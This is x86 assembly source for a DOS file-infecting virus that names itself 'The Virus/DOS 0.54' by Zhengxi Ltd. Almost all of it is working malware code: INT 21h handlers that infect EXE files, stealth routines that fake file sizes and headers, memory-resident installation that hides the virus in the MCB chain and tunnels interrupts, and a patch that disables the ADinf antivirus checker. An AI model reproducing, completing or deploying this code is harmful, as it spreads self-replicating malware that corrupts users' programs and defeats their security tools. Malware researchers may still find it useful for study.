INCLUDE ZURICH.ASI
code segment byte public
assume cs:code, ds:code, es:code, ss:code

extrn InfectTurn :byte
extrn r_lo:word
extrn r_hi:word
   extrn InfectName :near
extrn get_crc_just_fname:near
extrn heap:near
extrn crypt_exe_header:near
extrn no_freq_proc :near
extrn crypt_exe_header_custom:near
extrn WRITE_EXEHDR :near
extrn TEST_SIZE    :near
extrn STEALTHNAME  :near
extrn GET_SFT      :near
extrn vir_heap     :near
extrn InfectHandle :near
extrn start_data   :word
extrn get_own_name    :near
extrn heap            :near
extrn st25            :near
extrn ret_hook        :dword
extrn ret_sux         :word
extrn continue21      :near
extrn get_cur_time    :near
extrn calculate_crc   :near
extrn vir_heap        :near
extrn Calculate_CRC:near
extrn Calculate_CRC5:near




;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ÄÄÄ   VIRUS STARTUP   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
       org 0
pblabel virus_zero
       DB 0cH DUP (opNOP)
       dw 0        ;bp-30h : SS
       dw 0              ;bp-2eh : SP
       dw 0               ;bp-2ch : sum
       dw 0Ah+0cH               ;bp-2ah : IP
       dw 0               ;bp-28h : CS

        nop
        .EXIT
        org VIRUSSTACKSIZE-16h
pblabel begin_stack
st_es   dw      ?   ;-16
st_ds   dw      ?   ;-14
st_di   dw      ?   ;-12
st_si   dw      ?   ;-10
st_bp   dw      ?   ;-E
st_sp   dw      ?   ;-C
st_bx   dw      ?   ;-A
st_dx   dw      ?   ;-8
st_cx   dw      ?   ;-6
st_ax   dw      ?   ;-4
st_fl   dw      ?   ;-2
pblabel end_stack
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel virus_entry

        push si
        call vs
public _____
_____   db   (zmeflARX and 0FFh)
;0-classic EXE
;1-abnormal termination (for carrier)
;2-retf
pblabel relocator
        DO
            SEGCS lodsb
            db opSEGCS, 88h, 44h
shiftval    db ? ;            mov cs:[si+shiftval], al
        CYCLE LU
        iret
pblabel vs
        pop     si
        push    ax cx di bp
        pushf
        std
        lea     ax, _____
        sub     ax, si
        push    ax
        and     ax, 0Fh
        add     al, 11h ;suxxx*10h+1h   ;   suxxx=1
        mov     cs:[si+(offset shiftval)-(offset _____)], al
        pop     ax
        sar     ax, 4
        dec     ax      ;        sub     ax, suxxx
        mov     bp, sp
        mov     di, ss:[bp+4+6+2]
        cmp     byte ptr cs:[di-3], opCALL
        DOIF E
            add     1 ptr cs:[si+(offset shiftval)-(offset _____)], 060h
            sub     ax, 06h
            dec     di
            mov     byte ptr cs:[di], 0ECh
            dec     di
            mov     byte ptr cs:[di], 8Bh
            dec     di
            mov     byte ptr cs:[di], 55h
            mov     ss:[bp+4+6+2], di
            push cs
            push di
            pushf
            lea     bp, vvvo
        DOELSE
            lea     bp, vvv
        DONE
            mov     cx, cs
            sub     cx, ax
            push    cx
            push    bp
            lea     si, [si+((offset start_data))-_____]
            mov     cx, (offset start_data)-VIRUSSTACKSIZE+2
            jmp     relocator
;-------------
pblabel vvvo
begin_auto:
       pop     dword ptr cs:[frret]
       popf
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel vvv
       pop     bp di cx ax    si


       ;save vect1
       push     ds
       MOVSEG   ds, cs
       lea      dx, tmp1
       mov      ax, 2501h
       int      21h
       pop      ds

       pushf
       call     trace_cpm
       popf
       cmp      cs:_____, (zmeflOBJ and 0FFh)
       DOIF E
         inc sp
         inc sp

retobj   db 0EAh
public_key:
frret    dd ?
       DONE

       cmp      cs:_____, (zmeflIXE and 0FFh)
       DOIF E
          retf
       DONE
       cmp      cs:_____, (zmeflEXE and 0FFh) ;-?
       jnz      carrier                       ;/

    mov     cs:[vir_heap._after_goto], offset goto_exe
    call    user_proc
pblabel goto_EXE ;api
;(ss-es-0x17)<<4+sp
;ss=cs-1
;(cs-es-0x18)<<4+sp
    mov     ax, es
    mov     si, 10h
    add     ax, si
    push    es
    push    ax ;psp

    mov     bx, cs
    sub     ax, bx
    neg     ax
    cwd
    mul     si
    mov     si, [save_SP]
    sub     si, 7Eh
    add     ax, si
    adc     dx, 0
    push    si
    call    crypt_exe_header_custom
    pop     si
    lea     di, [heap]
    mov     cx, 16h/2
    rep     movsw
    call    di
    pop     ax
    pop     es
    movseg  ds, es
    add     cs:[(heap-2).exe_SS], ax
    add     cs:[(heap-2).exe_CS], ax
    mov     ss, cs:[(heap-2).exe_SS]
    mov     sp, cs:[(heap-2).exe_SP]
    jmp     dword ptr cs:[(heap-2).exe_IP]
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel carrier
    call    endmsg
;    db 'This program requires Microsoft Windows.'
; db 'The Application Program Interface (API) entered'
; db 'will only work in OS/2 mode.'
    db 'Abnormal program termination',CRLF,'$'
;public_key dd ?
    db CRLF,'The Virus/DOS 0.54  Copyright (c) 1995 Zhengxi Ltd'
;    db CRLF,'Don''t distribute this program!',CRLF
    db CRLF,'Warning! This program for internal use only!',CRLF

pblabel endmsg
    pop dx
    movseg ds, cs
    mov ah,9
    int 21h
    .exit
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;funcs21 equ    <00,11,12,31,3D,3E,3F,41,42,48,49,4A,4B,4C,4E,4F,67,6C> ;
funcs21 equ    <67,3E,6C,3F,49,00,3D,41,4A,11,4B,31,48,4C,4E,42,12,4F> ;

pblabel functions
% IRP foo, funcs21
    db (&foo&h shl 1) xor &foo&h
ENDM
funcnt =    $-functions

MROR MACRO w1, shval
    dw (w1 shr (shval and 0Fh)) or ((w1 shl (10h-(shval and 0Fh))) and 0FFFFh)
ENDM

MROL MACRO w1, shval
    dw ((w1 shl (shval and 0Fh)) and 0FFFFh) or (w1 shr (10h-(shval and 0Fh)))
ENDM

% IRP foo, funcs21
    MROR <((bfr_&foo-virus_zero) xor ($+2-virus_zero))>, <(bfr_aft-$)>
    MROL <((aft_&foo-virus_zero) - ($+2-virus_zero))>, <(bfr_aft-($-2))>
    public bfr_&foo
    public aft_&foo
ENDM
bfr_aft =   $-4




;-+------------------------------------------------------------------------+-
pblabel user_proc
    mov     cs:[vir_heap._save_ss], ss
    mov     cs:[vir_heap._save_sp], sp
    movseg  ss, cs
    lea     sp, end_stack
    pushf
    cli
    cld
    pushaw
    push    ds es
    lea     bp, vir_heap+80H
    call    [after_goto]
pblabel rt_err
    lea     sp, begin_stack ;end_stack-20d
    pop     es ds
    popaw
    popf
    mov     ss, cs:[vir_heap._save_ss]
    mov     sp, cs:[vir_heap._save_sp]
    retn
;-+------------------------------------------------------------------------+-
;-+------------------------------------------------------------------------+-
pblabel RANDOMIZE
    lea     si, begin_auto
    mov     di, end_auto-begin_auto
    mov     [si+(public_key-begin_auto).lo], ax
    mov     [si+(public_key-begin_auto).hi], dx
    call    Calculate_CRC
    mov     [r_lo], dx
    mov     [r_hi], cx
    ret
;-+------------------------------------------------------------------------+-

pblabel end_auto






;-+------------------------------------------------------------------------+-




bfr_3E:
    call    RND_GET
    DOIF BE
        ret
    DONE
    jmp     InfectHandle
aft_3E: ;ret
    jmp      InfectName




;-+------------------------------------------------------------------------+-
bfr_41:
pblabel Doctor_Name
    mov     ax, 3D12h
    ifInfJump   NameCustom
    movseg ds, ss
    push    ax dx
    call    restore_header
    pop     cx dx
    call    dosseek        ;seek
    call    DosTruncate
    call    write_exehdr
    jmp     dosclose
;Doctor_Name endp
;-+------------------------------------------------------------------------+-



;-+------------------------------------------------------------------------+-
aft_11:
aft_12:
    movseg  ds, cs
    and     al, al
    jnz     $ret
    mov     ah, 2fh      ; get DTA
    call    DosCall
    mov     ax, word ptr es:[bx+24h] ;really not need,
    call    test_size ;ZF=0 - no infected file  ;speed optimization
    jnz     $ret                                ;
    lea     di, StealthName
    mov     cx, 11d
    DO
        mov     al, es:[bx+8]
        inc     bx
        cmp     al, ' '
        DOIF NE
            mov     ds:[di], al
            inc     di
        DONE
        cmp     cx, 4
        DOIF E
            mov     byte ptr ds:[di], '.'
            inc     di
        DONE
    CYCLE LU
    mov     byte ptr cs:[di], ch ;0
    add     bx, 0Ch
    jmp     stlts_find_name
;-+------------------------------------------------------------------------+-




;-+------------------------------------------------------------------------+-
bfr_6C:
    test    dl, 1   ;no open
    PASS Z
    test    bl, 3   ;r/0
    DOIF NZ
        push    dx
        mov     dx, si
        call    Doctor_Name
        pop     dx
        MASKA   <ds:[st_bx.l]>, xxxxxx10  ;R/W    bl
    DONE
;-+------------------------------------------------------------------------+-
bfr_49:
aft_42:
aft_00:
aft_4C:
bfr_4f:
bfr_11:
bfr_12:
bfr_def:
@retn:
aft_def:
aft_41:
$ret:     ret
;-+------------------------------------------------------------------------+-



;-+------------------------------------------------------------------------+-
aft_4E:
aft_4F:
    MOVSEG  ds, cs
    lea     di, StealthName-1
    DO
        inc     di
        cmp     byte ptr [di], 0
    CYCLE NZ
    DO
        dec     di
        cmp     di, offset StealthName-1
        EXIT E
        cmp     byte ptr [di], '\'
    CYCLE NE
    inc     di
    mov     ah, 2Fh     ;get DTA
    call    DosCall


    mov      cx, 0Dh     ;es:bx+1e -0Dh-> ds:di
    DO
        push    word ptr es:find_buf_pname[bx]
        pop     ds:[di]
        inc     di
        inc     bx
    CYCLE LU
TROJANFILETIME = (6 shl 11d) or (6 shl 5) or (6 shr 1)
    cmp     es:[(bx-0Dh).find_buf_time], TROJANFILETIME
;DOIF E
;int 2bh
;DONE
    je  added_to_turn

    test    es:[(bx-0Dh).find_buf_attr], 10h ;directory ?
    jnz     no_added_to_turn
;

    call    RND_GET_BYTE
    and     ax, 0dh
    jnz     no_added_to_turn
;execut

;    lea     dx, StealthName
;    call    get_crc_just_fname
;    jz      no_added_to_turn
;-+--added to turn-------------------------------------------------------+-
;ds:dx -> InfectTurn
added_to_turn:
    lea     si, StealthName
    lea     di, InfectTurn
    push    es
    movseg  es, ss
    mov     cx, 40h
    rep     movsw
    pop     es

;int 2bh
;    cmp     es:[(bx-0Dh).find_buf_time], TROJANFILETIME

;    DOIF Z
;        call    InfectName   ;ZFlag
;    DONE
pblabel no_added_to_turn
;#

    mov     ax, es:[(bx-0Dh).find_buf_size_l] ;really not need,
    call    test_size ;ZF=0 - no infected file  ;speed optimization
    jnz     @retn                               ;
pblabel stlts_find_name           ;extention test ?
    lea     dx, StealthName
    mov     si, bx
    IfInfJump   Name   ;R/o mode ?
    mov     word ptr es:find_buf_size_l[si-0Dh], ax
    mov     word ptr es:find_buf_size_h[si-0Dh], dx
    jmp     dosclose
;-+------------------------------------------------------------------------+-


;-+------------------------------------------------------------------------+-
bfr_4E:
    movseg    es, cs
    mov       si, dx
    lea       di, StealthName
    mov       ah, 60h
    jmp       doscall
;-+------------------------------------------------------------------------+-



;-+------------------------------------------------------------------------+-
bfr_3D:
    test    al, 3
    DOIF NZ       ;W/O R/W
        call    Doctor_Name
        MASKA   <ds:[st_ax.l]>, xxxxxx10  ;R/W    al
$?ret:
        ret
    DONE


;comment #
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄADINFUCKÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

    call    get_crc_just_fname
    cmp_ax_CRC32w <'A', '-', 'D', 'i', 'n'>
    jne     $?ret
    mov     si, cs:[save_SP]
    mov     ax, word ptr ds:[si][4]
    add     ah, 0Eh
    mov     ds, ax
    xor     si, si
    DO
        mov     di, 8
        call    Calculate_CRC
        cmp_ax_CRC32w <74h, 0Ah, 0C4h, 5Eh, 0E2h, 26h, 81h, 0Fh>
        lodsw
        PASS NE
        xor     al, ah
        DOIF E
            mov     ax, ds:[si-12]   ;=1547 for {386}, =1557 for {86}
            add     ax, offset adinf386_fuck-1547h
            mov     byte ptr ds:[si-8], 3Dh ;fuck 3byte
            mov     byte ptr ds:[si-5], 9Ah
            mov     word ptr [si-4], ax
            mov     word ptr [si-2], cs
            DO
                call    Calculate_CRC5
                cmp_ax_CRC32w <0Ah, 0Bh, 0C0h, 74h, 3>
                DOIF E
                    xor     byte ptr ds:[si-4], 0Bh xor 4 ;or ax,ax -> add al, 0C0h
                    ret
                DONE
                sub     si, 6 ;backward search
            CYCLE NZ
        DONE
    sub     si, 9 ;forward search
    CYCLE NS     ;<8000h
    ret
;-+-[ fucking adinf 9.xx and 10.xx ]---------------------------------------+-
;new file size in (ax:dx){86} or eax{386}
;old file size in es:[bx.15h]
;-+------------------------------------------------------------------------+-
MINVIRSIZE equ 6000d
MAXVIRSIZE equ 16000d
adinf386_fuck proc far
    push    ax                     ; 1
    sub     ax, es:[bx+15h]        ; 4
    les     bx, [bp][-001Eh]       ; 3
    cmp     ax, MINVIRSIZE         ; 3
    ja      continue_fuck_1f_386   ; 2
    pop     ax                     ; 1
end_fuck_1f_386:
    ret                            ; 1
;-+------------------------------------------------------------------------+-
org adinf386_fuck+10h
;-+------------------------------------------------------------------------+-
adinf_fuck proc far
    xchg    ax, dx                 ; 1
    call    adinf386_fuck          ; 3
    xchg    ax, dx                 ; 1
    ret                            ; 1
adinf_fuck endp
;-+------------------------------------------------------------------------+-
continue_fuck_1f_386:
    cmp     ax, MAXVIRSIZE         ; 3
    pop     ax                     ; 1
    jb      end_fuck_1f_386        ; 2
    or      word ptr es:[bx],808h  ; 5   ;old command
    ret                            ; 1
adinf386_fuck endp
;-+------------------------------------------------------------------------+-





;-+------------------------------------------------------------------------+-
aft_6C:
    and     cx, cx   ;file opened
    DOIF Z
aft_3D:
        xchg    bx, ax
        IfInfJump Handle  ;patch SFT size
        call    get_sft
        mov     byte ptr es:[di.sf_name], 0     ;!^! íâ® ­ã¦­®, çâ®¡ë ä ©« ¯à¨ § ªàëâ¨¨ ­¥ ®¡à¥§ «áï
        mov     word ptr es:[di.sf_size.hi], dx
        mov     word ptr es:[di.sf_size.lo], ax
    DONE
    ret
;-+------------------------------------------------------------------------+-

;-+------------------------------------------------------------------------+-
bfr_3F: ;ret
    call    get_sft
    test    byte ptr es:[di.sf_mode], 3
    GOIN NZ
    cmp     word ptr es:[di.sf_position.hi], 0
    GOIN NZ
    mov     ax, word ptr es:[di.sf_position.lo]
    mov     [beg_pos_lo], ax
    cmp     ax, 18h
    DOIF AE
       call     noff
    DONE
    IfInfJump Handle
    call    save_seek ;if (cx > f_real_size-pos) cx := f_real_size-pos
    sub     ax, [saved_seek.lo]
    sbb     dx, [saved_seek.hi]
    DOIF Z
        MIN     <cs:[st_cx]>, ax  ;_CX
    DONE
    ret
;-+------------------------------------------------------------------------+-


;-+------------------------------------------------------------------------+-
aft_3F: ;ret
    mov    word ptr [st_rd_off], dx
    mov    si, ds ;si:di - buffer
    mov    cx, 1Ch
    sub    cx, [beg_pos_lo]
    MIN    cx, ax ;ax - delta pos
    mov    word ptr [rd_st_cnt],cx
    IfInfJump Handle
;-+------------------------------------------------------------------------+-
    call    get_sft ;dx:ax - original size,
    inc     byte ptr es:[di.sf_size.1] ;add 100h
    push    si
    call    restore_header
    dec     byte ptr es:[di.sf_size.1] ;sub 100h
    pop     es
;    DOIF    NC
;        mov     es, si ;es:di
        mov     cx, [rd_st_cnt]
        mov     di, [st_rd_off]
        lea     si, [vir_heap._exehdr]
        add     si, [beg_pos_lo]
        rep     movsb
;    DONE
    ret
;-+------------------------------------------------------------------------+-

;-+------------------------------------------------------------------------+-
bfr_42:
    cmp     al, 2 ;seek_end
    DOIF E
        call    seek_end
        call    Stealth_Seek ;seek to fake end
        dec     cs:[st_ax] ;    mov        ax, 4201h
    DONE
    retn
;-+------------------------------------------------------------------------+-
pblabel Stealth_Seek  ;dx:ax => cx:dx
    ifInfJump   Handle
    mov     cx, dx
    xchg    dx, ax
    jmp     dosseek
;-+------------------------------------------------------------------------+-


;comment #
;-+------------------------------------------------------------------------+-
bfr_4B:  ;show block
;    cmp     al, 0DBh
;    je      goto_EXE
    mov     [load_fname], dx
    mov     [load_array], bx
    push    ax
    call    show_block
    pop     ax
    test    al, 1 ;if 4b01(3) need after
    DOIF Z
pblabel noff
        mov    byte ptr cs:retu, opJMPS ;continue21-retu-1
    DONE
    retn

;-+------------------------------------------------------------------------+-
pblabel selector21
    movseg  ds, cs
    movseg  es, cs
    mov     al, ah
    add     al, al ;hach
    xor     al, ah
    mov     di, 8
    mov     word ptr ds:[(di-8)+arena_owner],  di ;cs
    lea     di, functions
    mov     cx, funcnt
    repne   scasb
    jnz     noff
    lea     si, bfr_aft
    shl     cx, 2
    sub     si, cx
    lodsw
    rol     ax, cl
    xor     ax, si
    mov     [after_goto], ax         ;bfr
    lodsw
    ror     ax, cl
    add     ax, si
    mov     word ptr [after_dos_goto], ax     ;aft
    ret

;-+------------------------------------------------------------------------+-
bfr_4A:
bfr_48:
;    cmp     al, 36h ;for 'Lingvo' compatible
;    mov     al, 0
;    DOIF NE
        mov       byte ptr cs:[dos_cf], 0 ;al
;    DONE

;-+------------------------------------------------------------------------+-
bfr_67:
pblabel show_block
;ret
;int 2bh
    call    find_mcb
    DOIF NE   ;si=0
        mov     cx, ds
        sub     bx, cx
        mov     ax, ds:[si.arena_size]
        sub     ax, bx
        mov     cs:[si.arena_size], ax
        dec     bx
        mov     ds:[si.arena_size], bx
        mov     al, byte ptr ds:[si.arena_signature]
        mov     byte ptr ds:[si.arena_signature], 'M'
        mov     byte ptr cs:[si.arena_signature], al
    DONE
    ret
;-+------------------------------------------------------------------------+-
aft_4B:
    mov     dx, [load_fname]
    call    loadprog
;-+--hide_block------------------------------------------------------------+-
aft_48:
aft_67:
aft_4A:
;ret
;int 2bh
pblabel hide_block
    call    find_mcb
    DOIF E
        mov     ax, cs:[si.arena_size]
        inc     ax
        add     ds:[si.arena_size], ax
        mov     al, byte ptr cs:[si.arena_signature]
        mov     byte ptr ds:[si.arena_signature], al
    DONE
    ret

;CRPROC find_mcb, 227Dh ;return ds
pblabel find_mcb
    sub     si, si
    mov     ah, 52h
    call    DosCall ;es:[bx][2] - root mcb
    mov     ax, es:[bx][-2]
    mov     bx, cs
    DO
        mov     ds, ax
        add     ax, word ptr ds:[si.arena_size]
        inc     ax
        cmp     ax, bx
    CYCLE B
    ret
;endp

;-+------------------------------------------------------------------------+-
pblabel loadprog
    ifInfJump Name

;    mov     si, word ptr [exehdr.exe_CS]
;    mov     di, word ptr [exehdr.exe_SS]
    push word ptr [exehdr.exe_CS]
    push word ptr [exehdr.exe_SS]
    push    es
    call    restore_header
    call    dosclose
    pop     es
    pop     di si
    mov     bx, [load_array]
    sub     si, word ptr [exehdr.exe_CS]
    sub     di, word ptr [exehdr.exe_SS]
    sub     word ptr es:Exec1_CS[bx], si
    sub     word ptr es:Exec1_SS[bx], di
    mov     si, word ptr [exehdr.exe_IP]
    mov     di, word ptr [exehdr.exe_SP]
    mov     word ptr es:Exec1_IP[bx], si
    mov     word ptr es:Exec1_SP[bx], di
@ret:
    ret
;loadprog endp
;-+------------------------------------------------------------------------+-


bfr_4C:
bfr_00:
IF @Cpu AND 1 ;x86
        push offset noff
ELSE          ;8086
        lea     ax, noff ;call aft_49
        push ax          ;jmp noff ;ret
ENDIF
bfr_31:
aft_31:
aft_49:
;ret
;time_test
;    call    get_cur_time
;    sub     ax, [last_infect_time]
;    cmp     ax, INTERVAL_INFECT ;0.5 ¬¨­
;    jl      @ret
 call     no_freq_proc


    mov     cs:arena_owner, 8
    mov     ax, 1600h   ;test for MS win
    int     2Fh
    cmp     ax, 1600h
    jne     @ret


    mov     ax, 5802h
    call    DosCall
    push    ax
    mov     bx, 1
    mov     ax, 5803h
    call    DosCall
    mov     ax, 5800h
    call    DosCall
    push    ax
    mov     bl, 82h ;high UMB use
    mov     ax, 5801h
    call    DosCall
    mov     ah, 48h
    mov     bx, all_memory_size_p-1
    call    DosCall
    DOIF NC
        sub     di, di
        dec     ax
        mov     es, ax
;        mov     bx, cs
;        cmp     ax, bx
;        DOIF B
;             mov     es:[di.arena_owner], di
;        DOELSE
            mov     cs:[di.arena_owner], di
            lds     si, dword ptr cs:offset25
            mov     word ptr ds:[si+3], es ;

            call    virus_move
;        DONE
    DONE
    mov     ax, 5801h ;restore
    pop     bx
    call    DosCall
    mov     ax, 5803h ;restore
    pop     bx
    jmp     DosCall

;-+------------------------------------------------------------------------+-


;-+------------------------------------------------------------------------+-
pblabel save_seek
    push      ax cx dx
    call      Dostell ;dx:ax - cur pos
    mov       [saved_seek.lo], ax
    mov       [saved_seek.hi], dx
    pop       dx cx ax
    ret
;save_seek endp
;-+------------------------------------------------------------------------+-

pblabel restore_header  ;dx:ax - original size
;int 2bh
    push    ax dx
    call    save_seek
    call    crypt_exe_header



    pop     cx dx
    call    DosSeek        ;seek
    lea     dx, [heap] ;[exehdr.exe_len_mod_512]
    mov     cx, 16h
    call    DosRead
    call    heap+16h

    lea     si, [heap]
    lea     di, [vir_heap._exehdr.exe_len_mod_512]
    mov     cx, 16h/2
    rep     movsw

pblabel restore_seek
    mov  dx, [saved_seek.lo]
    mov  cx, [saved_seek.hi]
    jmp  dosseek
;restore_seek endp
;restore_header endp




;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

pblabel p1
    lds     si, dword ptr [save_sp]
    lds     si, dword ptr ds:[si+2]
    mov     di, 0ch
    push    si
    call    calculate_crc
    pop     si
    cmp_ax_CRC32w <6h, 1Eh, 55h, 57h, 56h, 52h, 51h, 53h, 50h, 8Ch, 0D8h, 2Eh>
    JE  tunnel_detect
    cmp_ax_CRC32w <6h, 1Eh, 55h, 57h, 56h, 52h, 51h, 53h, 50h, 8Bh, 0ECh, 0E8h>
    jne     __retn
tunnel_detect:
;íâ® ¢ë¯®«­ï¥âáï â®«ìª® ¯à¨ ¯¥à¢®© ãáâ ­®¢ª¥ ¢¨àãá  ¢ ¯ ¬ïâì

        movseg  es, ss
        mov     cx, 11d
        lea     di, continue21
        rep     movsb
        sto_byte opJMPFAR

        mov     ax, 1600h  ;â¥áâ ­  ä®àâ®çª¨
        int     2Fh
        cmp     ax, 1600h
        jne     __retn
        mov     ax, 3305h      ;if BOOT-drive A: or B:
        int     21h
        sub     dl, 3
        jc      __retn
        push    ds   ;DS:SI - end of tunnel, (so21+TUNNELSIZE)
;---------------------------------------------------------------
;test for popup program
        mov     di, 2
        mov     ds, di
        mov     ax, word ptr ds:[(08h*4+2)+(di-2*11h)]
        cmp     ax, word ptr ds:[(13h*4+2)+(di-2*11h)]
        PASS NE
        cmp     ax, word ptr ds:[(28h*4+2)+(di-2*11h)]
        DOIF E
no_stay_resident:
            pop     ds
__retn:
            ret
        DONE
;---------------------------------------------------------------
        mov     ah, 2Fh
        int     21h     ;get DTA
        push    es bx
        movseg  ds, cs
        lea     dx, [vir_heap._exehdr]
        mov     ah, 1Ah
        int     21h     ;set DTA
        call    get_own_name ;ds:dx -curname
        mov     ah, 4Eh
        int     21h     ;find first
        pop     dx ds
        mov     ah, 1Ah
        int     21h     ;set DTA
        mov     ah, 2Ah
        int     21h     ;get system date
        xor     dx, [exehdr.find_buf_date]
        and     dx, 18h ;week only
        jz      no_stay_resident

        mov     ah, 51h
        int     21h

        mov     es, bx ;es- current PSP
        dec     bx
        mov     ds, bx ;ds- current MCB
        mov     bx, ds:[arena_size] ;ds- size of current block
        sub     bh, (all_memory_size_p shr 8)
        mov     ah, 4Ah
        int     21h      ; increate current block size
        mov     ah, 48h
        mov     bx, all_memory_size_p-1
        int     21h      ; allocate memory for virus
        jc      no_stay_resident ;cannot allocate memory for virus
        cmp   word ptr es:[0], 20CDh
        DOIF E
            sub    byte ptr es:[PDB_block_len+1], (all_memory_size_p shr 8)+1 ;correct PSP,  need for DN
        DONE
        dec     ax
        pop     es      ;o21
;so21 -> es:di ;si=o21+0Ch
        lea     di, [si-11d] ;[si-TUNNELSIZE]
        xchg    dx, ax ;ax - future virii segment
;get so25 (ds:si)
        mov     si, 8
        mov     ds, si
        lds     si, ds:[si][25h*4][-88h]
;so25 -> cs:[offset25]
;int 2bh
        mov     cs:[offset25.lo], si    ;ds:si  = so25
        mov     cs:[offset25.hi], ds    ;
;store (2Eh, 0FFh, 1Eh, o21+7, 0C7h, 6, o25, s25) -> [so21]
;write TUNNEL
        sto_byte        2Eh
        sto_two_byte    0FFh, 1Eh
        lea             ax, [di-3+5]
        mov             [hook], ax
        inc     ax
        inc     ax
        stosw
        sto_two_byte    0C7h, 6
        sto_word_       si ;o25
        sto_word_       ds ;s25
;move5 [so25] -> ss:(cs:)five_bytes
        lea     di, [vir_heap._five_bytes]
        movseg  es, ss
        movs5
;store (0EAh, memory_virentry, AX) -> [so25]
        movseg  es, ds  ;s25
        lea     di, [si-5]
        sto_byte opJMPFAR
        sto_word_ <offset memory_virentry>
        xchg    dx, ax ;ax - future virii segment
        stosw
        mov     es, ax  ;es - future virii segment
;----move virus to new location------------------------------------------+-
;----setup incubator-----------------------------------------------------+-
        call    get_cur_time
        add     ax, INCUB_TIME
        mov     cs:[last_infect_time], ax
pblabel virus_move
        mov     di, VIRUSSTACKSIZE
        mov     si, di
        lea     cx, [heap] ;virus_size
        segcs   rep    movsb
;        $BEEP$
no_stay:
    ret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel trace_cpm
    mov     cx, 1919h
    push    cs
    push    sp ;fake
    push    cx        ;for enable trace flag
    push    0Ch        ;        ;PUSH 0   1   b
    push    0         ;push 0  ;PUSH C0h  b0  10
;pblabel ent24
;    mov     al, 3
    iret           ;execute CP/M command
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


